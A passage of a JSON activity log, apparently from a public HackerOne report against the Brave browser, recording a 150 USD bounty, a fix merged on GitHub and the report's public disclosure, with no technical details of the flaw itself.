impact.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-10-04T18:44:42.436Z","updated_at":"2018-10-04T18:44:42.436Z","actor":{"username":"diracdeltas","cleared":false,"url":"/diracdeltas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/115/616/4e2016543ea3e299dcadd088be7d0225de3419e0_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"brave","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3435617,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2018-10-04T18:45:16.491Z","updated_at":"2018-10-04T18:45:16.491Z","actor":{"url":"/brave","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/688/2aad5641af643ee4f4402896e4747293f6e9c5ca_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Brave Software"}},"bounty_amount":"150.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"brave","collaborator":{"username":"qab","url":"/qab"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3437312,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"closing since https://github.com/brave/browser-laptop/pull/15261/ was merged","markdown_message":"\u003cp\u003eclosing since \u003ca title=\"https://github.com/brave/browser-laptop/pull/15261/\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fbrave%2Fbrowser-laptop%2Fpull%2F15261%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/brave/browser-laptop/pull/15261/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e was merged\u003c/p\u003e\n","automated_response":false,"created_at":"2018-10-05T05:27:31.362Z","updated_at":"2018-10-05T05:27:31.362Z","actor":{"username":"diracdeltas","cleared":false,"url":"/diracdeltas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/115/616/4e2016543ea3e299dcadd088be7d0225de3419e0_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"qab","url":"/qab"},"genius_execution_id":null,"team_handle":"brave","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3466448,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Looks like this was fixed with latest Brave update.","markdown_message":"\u003cp\u003eLooks like this was fixed with latest Brave update.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-10-11T18:03:12.325Z","updated_at":"2018-10-11T18:03:12.325Z","first_to_agree":true,"actor":{"username":"qab","cleared":true,"url":"/qab","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"brave","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3521840,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-10-23T19:13:25.197Z","updated_at":"2018-10-23T19:13:25.197Z","actor":{"username":"toml","cleared":false,"url":"/toml","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/229/717/56ea9edd04176aa3f29b215291bbc0b656699f67_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"brave","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3521841,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-10-23T19:13:25.273Z","updated_at":"2018-10-23T19:13:25.273Z","actor":{"username":"toml","cleared":false,"url":"/toml","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/229/717/56ea9edd04176aa3f29b215291bbc0b656699f67_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"brave","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}